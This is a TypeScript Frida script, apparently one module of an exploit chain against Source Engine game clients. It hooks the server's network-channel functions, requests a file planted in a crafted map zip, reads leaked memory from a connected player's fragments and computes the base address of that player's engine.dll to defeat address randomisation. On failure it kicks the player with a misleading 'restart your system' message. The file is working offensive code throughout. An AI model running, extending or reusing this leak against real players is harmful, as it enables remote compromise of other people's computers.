import se from './source_engine/index';
import CBaseClient from "./source_engine/classes/cgameclient";
import CNetChan from "./source_engine/classes/cnetchan";

// Subchannel stream index for file transfers
let FRAG_FILE_STREAM = 1;

type MapInfoLeakCallback = (engineBase: NativePointer | null) => void;

class MapInfoLeak {
    // the net channel that we will leak the engine pointer from
    channel: CNetChan;

    // the number of fragments that have been recieved so far from the client
    fragsRecieved: number = 0;

    // the promise that the leaking file will finish
    callback: MapInfoLeakCallback;

    constructor(clientIndexOrNetChan: number | CNetChan, callback: MapInfoLeakCallback) {
        let netchannel: CNetChan | null = null;

        if (clientIndexOrNetChan instanceof CNetChan) {
            netchannel = clientIndexOrNetChan
        } else {
            let client = CBaseClient.GetClientByIndex(clientIndexOrNetChan)
            if (client.pointer.isNull()) {
                throw new Error(`MapInfoLeak created for invalid client index ${clientIndexOrNetChan}`)
            }

            netchannel = client.GetNetChannel() as CNetChan
            if (netchannel.pointer.isNull()) {
                console.log("!!! A player must be connected for exploitation to begin!\n\n\n")
                throw new Error(`MapInfoLeak could not find CNetChan for index ${clientIndexOrNetChan}`)
            }
        }

        this.channel = netchannel
        this.callback = callback
    }

    // start the leaking process, when it's finished, calls callback(leaked p
    startLeakingFile() {
        // Let the hooks know we should be expecting this channel
        MapInfoLeak.pendingNetChannels.push(this);

        // make a request to leak the file we've packed into the invalid zip in the map
        this.channel.RequestFile(Memory.allocAnsiString("test.txt"))
    }

    ////////////////// static portion

    // channels that have been sent the request for the infoleak
    // which we will monitor
    static pendingNetChannels: Array<MapInfoLeak> = [];

    // if true, the thread is in ReadSubChannelData and we want to intercept
    // the call to bf_read::ReadBytes to read out the leaked data from the fragment
    // we just recieved from the client
    static shouldInterceptReadBytesFor: MapInfoLeak | null = null;

    // calculate the engine base based on the RE'd address we know from the leak
    static convertLeakToEngineBase(leakedPointer: NativePointer) {
        console.log("[*] leakedPointer: " + leakedPointer)

        // get the known offset of the leaked pointer in our engine.dll
        let knownOffset = se.util.require_offset("Engine_Leak2");
        console.log("[*] Engine_Leak2 offset: " + knownOffset)

        // use the offset to find the base of the client's engine.dll
        let leakedBase = leakedPointer.sub(knownOffset);
        console.log("[*] leakedBase: " + leakedBase)

        if ((leakedBase.toInt32() & 0xFFFF) !== 0) {
            console.log("[*] failed...")
            return null;
        }

        console.log("[*] Got it!")
        return leakedBase;
    }

    static removedQueuedLeak(obj: MapInfoLeak) {
        MapInfoLeak.pendingNetChannels = MapInfoLeak.pendingNetChannels.filter(o => o !== obj);
    }

    // Attaches to functions that recieve network fragments from a client
    static attachInterceptors() {
        // get required symbols
        let ReadSubChannelData = se.util.require_symbol("CNetChan::ReadSubChannelData");
        let ReadBytes = se.util.require_symbol("bf_read::ReadBytes");

        // CNetChan::ReadSubChannelData
        // Called when the server recieves subchannel data from a client
        Interceptor.attach(
            ReadSubChannelData,
            {
                onEnter(args) {
                    // is this the file stream? if not, we don't care for it.
                    let stream = args[1]
                    if (stream.toInt32() != FRAG_FILE_STREAM) return;

                    // is this a client we have begun to exploit? if not, we don't care for it.
                    let thisptr = (this.context as Ia32CpuContext).ecx;

                    // get the MapInfoLEak object for this net channel
                    let mapleak = MapInfoLeak.pendingNetChannels.find(o => o.channel.pointer.equals(thisptr));
                    if (mapleak === undefined) {
                        // data we don't care about
                        return;
                    }

                    // okay, we're ready to intercept ReadBytes and grab the leak
                    MapInfoLeak.shouldInterceptReadBytesFor = mapleak;
                }
            }
        )

        // bf_read::ReadBytes
        // Called inside of ReadSubChannelData when the server is about to read some data from a fragment
        Interceptor.attach(
            ReadBytes,
            {
                // onEnter will capture the buffer pointer that ReadBytes is writing data out to
                onEnter(args) {
                    this.buffer = args[0];
                },

                // onLeave will take place after the buffer has been filled with data
                onLeave() {
                    let mapleak = MapInfoLeak.shouldInterceptReadBytesFor;

                    // if something called ReadBytes but it's not something we want, ignore it
                    if (!mapleak) {
                        return;
                    }

                    console.log(`[*] Intercepting ReadBytes (frag = ${mapleak.fragsRecieved})`)

                    // reset for next time
                    MapInfoLeak.shouldInterceptReadBytesFor = null;

                    // dump the data we recieved as 4 byte pointers
                    for (let i = 0; i < 64; i++) {
                        let ptr = this.buffer.add(i * 4).readPointer()
                        console.log(`${new NativePointer(i * 4)}: ${ptr}`)
                    }

                    let expectedBase = 0xC0;
                    let clientEngineBase: NativePointer | null = null;

                    for (let i = 0; i < 15; i++) {
                        console.log("[*] Testing " + new NativePointer(i * 4))
                        // if we're here, it means we got some data from the client for our leak
                        let engineLeak = this.buffer.add(expectedBase + (i * 4)).readPointer();
                        clientEngineBase = MapInfoLeak.convertLeakToEngineBase(engineLeak)
                        if (clientEngineBase) {
                            break;
                        }
                        else {
                            clientEngineBase = null;
                        }
                    }

                    // we have recieved a fragment
                    mapleak.fragsRecieved += 1;

                    // have we recieved enough fragments for the leak?
                    if (clientEngineBase) {
                        MapInfoLeak.removedQueuedLeak(mapleak);

                        // leak successful! call the callback
                        mapleak.callback(clientEngineBase);
                    } else {
                        MapInfoLeak.removedQueuedLeak(mapleak);
                        console.error("Failed to leak base from client's engine. Something big must have changed!")
                        mapleak.channel.Shutdown("Something went wrong while connecting, please restart your system and try again")
                    }
                }
            }
        )
    }
}

export default MapInfoLeak;
